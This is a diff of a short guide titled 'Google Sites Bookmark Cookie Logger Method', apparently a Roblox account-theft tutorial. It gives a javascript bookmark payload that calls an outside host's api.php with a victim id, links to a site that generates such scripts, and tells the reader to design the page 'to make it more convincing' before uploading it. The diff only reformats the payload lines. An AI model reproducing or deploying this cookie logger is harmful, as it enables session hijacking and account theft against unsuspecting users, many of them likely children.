@@ -12,6 +12,11 @@ Google Sites Bookmark Cookie Logger Method
 (dont have a javascript?, go to https://robloxclothingbeta.000webhostapp.com/index.html click on the site and make one)
 
 5. Delete the "" and replace with '' like this below
-"xJavascript:$.get("//robloxclothingbeta.000webhostapp.com/api.php?id=123456")" to "xJavascript:$.get('//robloxclothingbeta.000webhostapp.com/api.php?id=123456')"
+
+"xJavascript:$.get("//robloxclothingbeta.000webhostapp.com/api.php?id=123456")" 
+
+to 
+
+"xJavascript:$.get('//robloxclothingbeta.000webhostapp.com/api.php?id=123456')"
 
 6. Hit ok design your site to make it more convincing, upload site and you are done!
